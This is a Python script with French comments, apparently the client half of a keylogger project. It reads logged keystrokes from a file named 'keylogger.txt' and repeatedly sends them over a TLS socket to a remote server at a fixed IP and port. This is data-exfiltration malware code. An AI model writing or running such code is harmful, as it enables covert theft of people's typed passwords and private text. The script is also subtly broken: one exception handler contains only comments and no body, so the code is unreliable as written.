import socket
import ssl
import time

def read_data_from_file(file_path):
    with open(file_path, 'r') as file:
        data = file.read()
    return data




host = '172.16.120.1'
port = 8443 

file_path = 'keylogger.txt'  

# Lire les données du fichier
keyboard_data = read_data_from_file(file_path)

# création du socket
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.settimeout(3.0)

# création du contexte ssl (avec le certificat du serveur)
context_ssl = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
context_ssl.load_verify_locations(cafile="./ssl2/certificate.pem")


# Connexion au serveur (avec implémentation du chiffrement)
conn_ssl = context_ssl.wrap_socket(client_socket, server_hostname='localhost')
conn_ssl.connect((host, port))

running = True
t1 = time.time()


while running:
    try:
        t2 = time.time()

        if t2 - t1 > 10:
            # update de t1
            t1 = t2

            # envoyer les données au serveur
            conn_ssl.send(keyboard_data.encode('utf-8'))

            data = conn_ssl.recv(1024)

            print("data received !")
            print(data.decode("utf-8"))

    except ssl.SSLEOFError as e:
        # retenter la connexion pendant 10 minutes
        # -> kill_client()

    except Exception as e:
        print(type(e))
        


# fin de la connexion
conn_ssl.close()
client_socket.close()
